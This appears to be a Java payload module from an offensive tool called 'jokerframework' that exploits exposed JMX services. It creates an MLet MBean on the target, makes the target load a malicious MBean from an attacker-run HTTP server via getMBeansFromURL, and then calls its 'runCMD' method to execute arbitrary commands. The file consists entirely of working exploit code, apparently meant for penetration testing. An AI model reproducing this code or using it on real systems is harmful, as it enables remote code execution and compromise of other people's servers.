package com.lucifaer.jokerframework.modules.payloads;

import com.lucifaer.jokerframework.core.shell.config.JokerShellHelper;
import com.lucifaer.jokerframework.modules.Payload;
import com.lucifaer.jokerframework.plugins.Client;
import com.lucifaer.jokerframework.plugins.Server;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Component;

import javax.management.*;
import java.util.Map;
import java.util.Set;

@Component(value = "jmxCommand")
public class JmxCommand implements Payload {
    @Autowired
    @Qualifier("jmxClient")
    private Client client;

    @Autowired
    @Qualifier("jmxHttpServer")
    private Server server;

    @Autowired
    JokerShellHelper jokerShellHelper;

    private MBeanServerConnection mbsc;
    private ObjectInstance mletBean;
    private Map<String, String> params;

    @Override
    public void exploit() {
        this.mbsc = (MBeanServerConnection) client.init();
        try {
            getMletBean();
            jokerShellHelper.echoInfo("Loading " + this.mletBean.getClassName());
            jokerShellHelper.echoInfo("Executing command: " + params.get("command"));
            String[] mletParams = {params.get("command")};
            String[] mletSigneture = {"java.lang.String"};
            String reader = (String) this.mbsc.invoke(this.mletBean.getObjectName(), "runCMD", mletParams, mletSigneture);
            jokerShellHelper.echoSuccess(reader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(Map<String, String> params) {
        this.params = params;
    }

    private void getMletBean() throws Exception {
        try {
            this.mletBean = mbsc.getObjectInstance(new ObjectName("Payload:name=payload,id=1"));
        }
        catch (InstanceNotFoundException e) {
            String mletClass = "javax.management.loading.MLet";
            try {
                this.mletBean = mbsc.createMBean(mletClass, null);
                install();
                getMletBean();
            }
            catch (InstanceAlreadyExistsException error) {
                this.mletBean = mbsc.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                install();
                getMletBean();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void install() throws Exception {
        String[] mletParams = {server.getServerUrl() + ":" + server.getServerPort()};
        String[] mletSigneture = {"java.lang.String"};
        Set mbeanSet = (Set) this.mbsc.invoke(this.mletBean.getObjectName(), "getMBeansFromURL", mletParams, mletSigneture);
        for (Object element : mbeanSet) {
            if (element instanceof ObjectInstance) {
                jokerShellHelper.echoInfo("Object name = " + ((ObjectInstance)element).getObjectName());
            }
            else {
                jokerShellHelper.echoError("Exception = " + ((Throwable)element).getMessage());
                jokerShellHelper.echoError("Install Fail");
            }
        }
        jokerShellHelper.echoSuccess("Install Successful");
    }
}
